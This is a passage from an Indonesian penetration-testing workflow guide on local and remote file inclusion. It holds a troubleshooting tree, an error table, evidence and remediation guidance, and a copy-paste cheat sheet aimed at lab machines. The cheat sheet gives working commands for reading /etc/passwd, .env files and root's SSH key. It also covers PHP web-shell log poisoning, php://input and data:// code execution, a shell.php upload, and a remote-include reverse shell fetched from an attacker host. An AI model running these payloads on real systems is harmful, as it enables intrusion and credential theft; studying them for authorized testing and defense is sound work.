Gunakan sebagai diagnostic tree: **apa yang gagal → asumsi apa yang salah → evidence apa yang harus dikumpulkan berikutnya.** Ini satu-satunya alur troubleshooting di dokumen ini — tabel referensi di bagian akhir untuk lookup cepat error spesifik.

## 9.1 Diagnostic Tree

```text
PAYLOAD GAGAL
    ↓
Apakah parameter benar-benar mempengaruhi resource yang di-load?
    │
    NO → Response identik dengan baseline untuk semua payload
    │     Asumsi salah: parameter ini bukan LFI/bukan file input
    │     → Kembali ke Part 1 (parameter discovery): fuzz parameter lain, cek POST/Cookie/Header
    │
    YES
    ↓
Apakah path yang dituju benar?
    │
    NO → Error "No such file or directory", atau file kosong padahal seharusnya ada
    │     Asumsi salah: depth traversal atau target path salah
    │     → Part 2.3 (depth calculation): coba depth lain; Part 1: test /etc/passwd sebagai known file
    │
    YES (path benar, tapi tetap gagal)
    ↓
Apakah ada filter yang mengubah/menolak input?
    │
    YES → "../" terlihat diblokir/dihapus, atau muncul error validasi
    │     Asumsi salah: raw traversal cukup
    │     → Part 2.4: amati transformasi (strip? decode? normalize?), pilih bypass yang sesuai
    │
    NO (tidak ada filter terlihat)
    ↓
Apakah file benar-benar readable oleh proses web server?
    │
    NO → "Permission denied", response kosong untuk file yang seharusnya ada
    │     Asumsi salah: LFI = akses penuh filesystem
    │     → Pilih file lain (P0 di Part 3), jangan asumsikan privilege tinggi
    │
    YES
    ↓
Apakah ini benar-benar INCLUDE, bukan hanya READ?
    │
    NO → Content muncul sebagai teks mentah, tidak pernah dieksekusi meski berisi kode
    │     Asumsi salah: readfile()/send_file() disangka include()/require()
    │     → Cek source code (Part 3.3) untuk fungsi yang dipakai; distinguish read vs include (Part 0.1)
    │
    YES
    ↓
Apakah content yang di-include benar-benar diinterpretasikan?
    │
    NO → Marker PHP muncul sebagai teks, bukan dieksekusi
    │     Asumsi salah: LFI otomatis berarti code execution
    │     → Investigasi primitive execution yang sesuai: Part 4 (wrapper), Part 6 (attacker-controlled file), Part 7 (RFI)
    │
    YES → RCE confirmed, lanjut ke validasi (Part 5.3) dan Part 10 (evidence/dokumentasi)
```

## 9.2 Tabel Referensi Cepat (Konsolidasi)

|#|Error / Kondisi|Kemungkinan Sebab|Langkah Berikutnya|
|--:|---|---|---|
|1|Response identik untuk semua payload|Parameter bukan LFI / bukan file input|Fuzz parameter lain; cek POST/Cookie/Header (Part 1.1)|
|2|`File not found` / `No such file or directory`|Depth traversal salah, atau path target tidak ada|Uji `/etc/passwd`, `/etc/hosts`, `/etc/hostname`; sesuaikan depth (Part 2.3)|
|3|`Permission denied`|Web process tidak punya permission|Pilih file readable lain (Part 3), jangan asumsikan LFI = root|
|4|`include(): Failed opening required`|Include gagal pada path tsb|Baca exact path dari pesan error|
|5|`../` tampak diblokir|Filter/WAF|Amati transformasi, pilih bypass sesuai (Part 2.4)|
|6|`%2e%2e%2f` gagal|Decode terjadi sebelum/sesudah filter secara berbeda|Uji raw vs encoded, amati normalization|
|7|Double encoding gagal|Hanya ada satu decode stage|Jangan asumsikan dua-stage decoder|
|8|`....//` gagal|Filter melakukan canonicalization, bukan single-pass strip|Coba absolute path atau alternative syntax|
|9|Absolute path gagal|Aplikasi menambahkan prefix tetap|Trace resulting path melalui pesan error|
|10|Null byte tidak bekerja|PHP modern (>= 5.3.4)|Jangan gunakan untuk PHP modern (Part 2.4)|
|11|`php://filter` gagal|Wrapper diblokir atau nama file salah|Coba exact syntax dan file target berbeda|
|12|Base64 output kosong|Resource path salah|Confirm file path dulu dengan `page=` biasa|
|13|Base64 decode error|Response mengandung HTML/noise|Strip HTML dulu sebelum decode (Part 4.2)|
|14|`php://input` gagal|Include/config tidak cocok, atau `allow_url_include=Off`|Coba `php://filter`, upload+LFI, atau filter chain|
|15|`data://` gagal|Wrapper/config restriction|Cek konfigurasi, coba primitive lain|
|16|`expect://` gagal|Extension tidak terpasang (umum)|Skip, lanjut ke primitive lain (Part 4.5)|
|17|Log file tidak readable|Permission atau path salah|Test log lain, atau `/proc/self/fd/*`|
|18|Log poisoning: marker tidak muncul di log|Header tidak masuk ke log format tsb|Coba header lain (Referer, X-Forwarded-For)|
|19|Log poisoning: marker ada tapi tidak dieksekusi|Fungsi baca log adalah `readfile()` bukan `include()`|Cek source code untuk fungsi yang benar-benar dipakai|
|20|Upload berhasil tapi LFI ke file itu gagal|Predicted path salah|Cari response/HTML/endpoint untuk path asli (Part 6.1)|
|21|ZIP upload berhasil tapi `zip://` gagal|Path archive salah|Confirm absolute path archive|
|22|RFI gagal, tidak ada request masuk ke attacker|`allow_url_include=Off` atau firewall/egress filtering|Cek phpinfo/config; fokus ke LFI-only path|
|23|RFI: request masuk tapi PHP tidak dieksekusi|Remote content di-fetch sebagai data, bukan di-include sebagai kode|Test teks polos dulu, baru PHP (Part 7.2)|
|24|SMB share tidak pernah menerima koneksi|Target bukan Windows/UNC unsupported|Gunakan jalur HTTP RFI atau hentikan cabang SMB|
|25|`/proc/self/environ` tidak menunjukkan header|Header tidak menjadi environment variable pada stack ini|Jangan asumsikan header = env (Part 6.3)|
|26|LFI works, RCE tidak|LFI ≠ code execution (Part 0.1)|Coba wrapper/source disclosure/upload/log route|
|27|Command menghasilkan `0` bukan output|Membaca return code, bukan stdout|Gunakan primitive yang mengembalikan output (Part 5.3)|
|28|Filter chain 500 error|Payload/URL terlalu panjang untuk GET|Kirim via POST (Part 4.8)|
|29|Session poisoning gagal|Path session storage berbeda dari asumsi|Cek `session.save_path` di `php.ini`/source (Part 6.4)|
|30|WAF memblokir semua payload traversal|Input filtering agresif|Coba encoding ganda atau filter chain (pola berbeda dari traversal biasa)|
|31|Browser bekerja, curl gagal (atau sebaliknya)|Request mismatch antara tool|Copy exact raw request dari Burp Repeater|

---

# Part 10 — Pentest Evidence & Remediation

## 10.1 Evidence yang Harus Didokumentasikan

Berlaku untuk kedua Operating Mode (lihat halaman awal), tetapi terutama wajib untuk authorized pentest:

```text
[ ] Vulnerable parameter (nama + method: GET/POST/Cookie/Header)
[ ] Exact request (raw request, bukan hanya payload)
[ ] Exact payload yang berhasil
[ ] Response (atau cuplikan yang relevan sebagai bukti)
[ ] Root cause (fungsi apa yang vulnerable: include/require/readfile/dst)
[ ] Engine/version bila diketahui (PHP version, web server, framework)
[ ] Impact (file read saja? source disclosure? RCE?)
[ ] RCE path yang dipakai, jika applicable, beserta prerequisite yang terbukti
[ ] Evidence tambahan (screenshot/log attacker-side untuk RFI/log poisoning)
[ ] Remediation yang direkomendasikan
```

Untuk authorized pentest: hentikan eskalasi begitu impact sudah cukup dibuktikan sesuai scope — source disclosure yang mengonfirmasi credential exposure sering sudah cukup sebagai bukti tanpa perlu lanjut ke reverse shell, kecuali scope memang meminta full exploitation chain.

## 10.2 Root Cause — Apa yang Harus Diperbaiki

**Jangan:**

```php
include($_GET['page']);
```

**Gunakan allowlist:**

```php
$pages = [
    'home' => __DIR__ . '/pages/home.php',
    'about' => __DIR__ . '/pages/about.php',
];

$page = $_GET['page'] ?? 'home';

if (!array_key_exists($page, $pages)) {
    http_response_code(404);
    exit;
}

include($pages[$page]);
```

## 10.3 Defense Principles

```text
1. Jangan gunakan arbitrary user-controlled include path.
2. Gunakan allowlist, bukan blacklist.
3. Canonicalize path sebelum security decision (bukan filter string mentah).
4. Batasi file ke directory yang memang diperlukan (base directory check).
5. Hindari dynamic include bila tidak diperlukan.
6. Jangan aktifkan allow_url_include tanpa kebutuhan eksplisit.
7. Gunakan least privilege untuk proses web server.
8. Jangan simpan secrets di source code jika dapat dihindari (gunakan env/secret manager).
9. Jangan expose verbose PHP error di production.
10. Audit upload + file inclusion sebagai satu attack surface gabungan, bukan terpisah.
```

## 10.4 Golden Rules (Ringkasan Prinsip)

```text
1. LFI ≠ RCE.
2. /etc/passwd adalah proof awal, bukan tujuan akhir.
3. php://filter sering lebih berguna daripada langsung mengejar RCE.
4. Source code → configuration → secrets → new attack surface (Part 0.3).
5. Blacklist traversal ≠ secure file handling.
6. Null-byte bypass adalah teknik legacy, bukan universal PHP trick.
7. RFI membutuhkan remote-fetch/include behavior; LFI tidak otomatis berarti RFI.
8. Log poisoning membutuhkan attacker-controlled log content DAN LFI/include yang memprosesnya.
9. Windows UNC/SMB bukan pengganti umum untuk HTTP RFI — gunakan hanya ketika target semantics mendukungnya.
10. Selalu validasi RCE dengan primitive sederhana: id / whoami / pwd / hostname.
```

---

# Part 11 — Cross-Workflow References

LFI/RFI jarang berdiri sendiri. Konsumsi evidence dari workflow recon/enumerasi sebelumnya, dan alihkan ke workflow lain begitu evidence mengarah ke domain tsb — jangan menyalin seluruh materi workflow tersebut ke sini.

**Input yang dikonsumsi dari recon sebelumnya:** web server, OS, language/runtime, framework/CMS, endpoint menarik, parameter yang sudah ditemukan. → [Web Recon / Fingerprinting Workflow]

**Output yang mengarah ke workflow lain:**

```text
SSH key / credential ditemukan       → <a href="/docs/ssh" class="text-[#00b4d8] hover:underline font-mono font-semibold">06_ssh_workflow.md</a>
FTP credential ditemukan             → <a href="/docs/ftp" class="text-[#00b4d8] hover:underline font-mono font-semibold">07_ftp_workflow.md</a>
MySQL credential ditemukan           → <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>
PostgreSQL credential ditemukan      → <a href="/docs/postgresql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14c_postgresql_workflow.md</a>
Redis/MongoDB credential ditemukan   → <a href="/docs/redis-and-mongodb" class="text-[#00b4d8] hover:underline font-mono font-semibold">14d_redis_mongodb_workflow.md</a>
WordPress terdeteksi                 → <a href="/docs/wordpress" class="text-[#00b4d8] hover:underline font-mono font-semibold">17a_wordpress_workflow.md</a>
Upload bypass lebih lanjut diperlukan → <a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>
Shell didapat → cek privilege        → <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
SUID/sudo rights ditemukan           → <a href="/docs/sudo-suid-capabilities" class="text-[#00b4d8] hover:underline font-mono font-semibold">47_sudo_suid_capabilities_workflow.md</a>
Internal network/double NIC terdeteksi → <a href="/docs/pivoting-tunneling" class="text-[#00b4d8] hover:underline font-mono font-semibold">64_pivoting_tunneling_workflow.md</a>
Password hash ditemukan (mis. /etc/shadow) → [Password Cracking Workflow]
```

Gunakan referensi ini sebagai **titik transisi**, bukan sebagai daftar yang harus dijalankan semua — pilih sesuai evidence yang benar-benar ditemukan.

---

# Quick Reference

Satu-satunya cheatsheet copy-paste di dokumen ini.

```bash
# === SETUP (sekali di awal sesi) ===
export TARGET="10.10.11.100"
export LHOST="10.10.14.5"      # IP tun0 (VPN HTB/THM)
export LPORT="4444"
export WEBPORT="8080"          # port HTTP server sendiri untuk RFI
mkdir -p ~/lfi_loot/{source,creds,logs,payloads,keys}
alias lfi='curl -sG "http://$TARGET/index.php" --data-urlencode'

# === KONFIRMASI LFI ===
lfi "page=../../../../etc/passwd"                          # Linux basic
lfi "page=../../../../windows/win.ini"                     # Windows basic
lfi "page=/etc/passwd"                                     # Absolute path
lfi "page=....//....//....//etc/passwd"                    # Filter bypass (single-pass strip)
lfi "page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"          # URL-encoded traversal

# === SUMBER FILE SENSITIF (Part 3) ===
lfi "page=../../../../proc/self/environ" # tr '\0' '\n' saat parsing
lfi "page=../../../../var/www/html/.env"
lfi "page=../../../../var/www/html/config.php"

# === SOURCE CODE DISCLOSURE (Part 4.2) ===
lfi "page=php://filter/convert.base64-encode/resource=index.php" | base64 -d
lfi "page=php://filter/convert.base64-encode/resource=config.php" | base64 -d
lfi "page=php://filter/convert.base64-encode/resource=.env" | base64 -d

# === LOG POISONING (Part 6.2) ===
curl -s -A '<?php system($_GET["cmd"]); ?>' "http://$TARGET/"
lfi "page=../../../../var/log/apache2/access.log" --data-urlencode "cmd=id"

# === WRAPPER RCE (Part 4.3–4.4) ===
# php://input
curl -s -X POST "http://$TARGET/index.php?page=php://input" --data '<?php system("id"); ?>'
# data://
lfi "page=data://text/plain;base64,$(printf '<?php system("id"); ?>' | base64 -w 0)"

# === FILTER CHAIN RCE (Part 4.8) ===
git clone https://github.com/synacktiv/php_filter_chain_generator ~/tools/fcg
python3 ~/tools/fcg/php_filter_chain_generator.py --chain '<?php system("id"); ?>' | tail -1 > /tmp/chain.txt
lfi "page=$(cat /tmp/chain.txt)"

# === UPLOAD + LFI (Part 6.1) ===
curl -s -F 'file=@shell.php' "http://$TARGET/upload"
lfi "page=/var/www/html/uploads/shell.php"

# === SSH KEY (Part 3.5) ===
lfi "page=../../../../root/.ssh/id_rsa" > /tmp/root_rsa.txt
grep -A 9999 "BEGIN" /tmp/root_rsa.txt | grep -B 9999 "END" > /tmp/id_rsa
chmod 600 /tmp/id_rsa && ssh -i /tmp/id_rsa root@$TARGET

# === RFI (Part 7) ===
python3 -m http.server "$WEBPORT" &
lfi "page=http://$LHOST:$WEBPORT/revshell.php"

# === DETECTION SCANNER (Part 1.6) ===
./lfi_detect.sh "http://$TARGET/index.php" "page"
```

---

# 60-Second Muscle Memory

Satu-satunya muscle memory sequence di dokumen ini. Jangan hafal `../../../../etc/passwd` sebagai tujuan — hafal proses berpikirnya.

Saat menemukan parameter `file=` / `page=` / `include=` / `path=` / `template=` / `view=` / `lang=`:

```text
KONFIRMASI
 1. Baseline request
 2. ../../../../etc/passwd
 3. ../../../etc/passwd
 4. /etc/passwd
 5. %2e%2e%2f... (bila raw traversal gagal)
 6. /etc/hosts
 7. /etc/hostname

JIKA CONFIRMED
 8. php://filter (source disclosure — bila PHP)
 9. application config (.env, config.php, wp-config.php)
10. /proc/self/environ
11. log discovery (baca dulu, jangan asumsikan writable)
12. upload path (dari source code)

PILIH ESCALATION (sesuai evidence, Part 0.4 prioritas)
13. php://input / data:// (bila include() + config cocok)
14. upload + LFI
15. log poisoning
16. filter chain generator (bila primitive lain tidak tersedia)
17. session poisoning (bila session path diketahui)

BILA RFI TERLIHAT MUNGKIN
18. test remote text file
19. verifikasi callback masuk ke attacker
20. test remote PHP di lab

VALIDASI
21. id / whoami / pwd / hostname

DOKUMENTASI
22. simpan request, payload, response, root cause (Part 10.1)
```

> **Inti workflow 24:** _"Parameter apa yang mengontrol file → file apa yang bisa dibaca → OS/framework apa → apakah PHP memproses inclusion → apakah source dapat dibocorkan → apakah ada wrapper/upload/log/session yang dapat menjadi execution primitive."_

---

# References

- [PHP Filter Chain Generator — synacktiv GitHub](https://github.com/synacktiv/php_filter_chain_generator)
- [Blog Post: PHP filter chains — Charles Fol / Synacktiv](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle.html)
- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- ffuf — fuzzing tool untuk parameter dan payload discovery
- LFISuite / LFImap — automation tool untuk LFI detection (verifikasi repository/branch sendiri, project pihak ketiga dapat berubah)
- Impacket (`impacket-smbserver`) — untuk lab SMB/UNC RFI

---

→ [File 25: File Upload](/docs/file-upload)